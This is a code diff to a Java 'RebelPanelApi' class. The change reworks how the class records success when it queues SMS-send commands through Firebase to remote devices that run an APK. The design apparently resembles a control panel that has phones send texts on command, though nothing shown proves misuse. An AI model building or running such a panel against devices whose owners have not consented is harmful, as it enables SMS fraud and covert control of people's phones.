@@ -58,6 +58,9 @@ final class RebelPanelApi {
 
             List<SendAttempt> attempts = sendPathsForDevice(deviceId, schema, deviceNode, url);
             String lastError = "Failed to send SMS — device offline or Firebase error";
+            boolean patchOk = false;
+            boolean webhookOk = false;
+            String okPath = "";
 
             for (SendAttempt attempt : attempts) {
                 JSONObject payload = sendPayloadForType(attempt.type, sim, to, message, deviceId);
@@ -65,19 +68,40 @@ final class RebelPanelApi {
                         ? attempt.method : "PUT";
                 JSONObject res = RebelFirebaseClient.request(method, url, authKey, attempt.path, payload);
                 if (res != null) {
-                    String hint = "rto9".equals(attempt.type)
-                            ? " Command queued — device must be online on APK to send."
-                            : "";
-                    JSONObject out = new JSONObject();
-                    out.put("ok", true);
-                    out.put("message", "SMS command sent to device" + hint);
-                    out.put("sim", sim);
-                    out.put("to", to);
-                    out.put("path", attempt.path);
-                    out.put("schema", attempt.type);
-                    return out;
+                    if ("PATCH".equalsIgnoreCase(method) && !attempt.path.contains("webhookEvent")) {
+                        patchOk = true;
+                    }
+                    if (attempt.path.contains("webhookEvent/sendSms")) {
+                        webhookOk = true;
+                    }
+                    okPath = attempt.path + " (" + method + ")";
+                    if (patchOk && webhookOk) {
+                        break;
+                    }
+                    if (patchOk && ("rto9".equals(attempt.type) || "rabel".equals(schema))) {
+                        continue;
+                    }
+                    if (!"rto9".equals(attempt.type) && !"rabel".equals(schema)) {
+                        break;
+                    }
                 }
                 lastError = "Failed via " + attempt.path;
+            }
+
+            if (patchOk || webhookOk) {
+                String hint = patchOk
+                        ? " Command queued — device must be online on APK to send."
+                        : "";
+                JSONObject out = new JSONObject();
+                out.put("ok", true);
+                out.put("message", "SMS command sent to device" + hint);
+                out.put("sim", sim);
+                out.put("to", to);
+                out.put("path", okPath);
+                out.put("schema", schema);
+                out.put("patchOk", patchOk);
+                out.put("webhookOk", webhookOk);
+                return out;
             }
             return error(lastError);
         } catch (Exception e) {
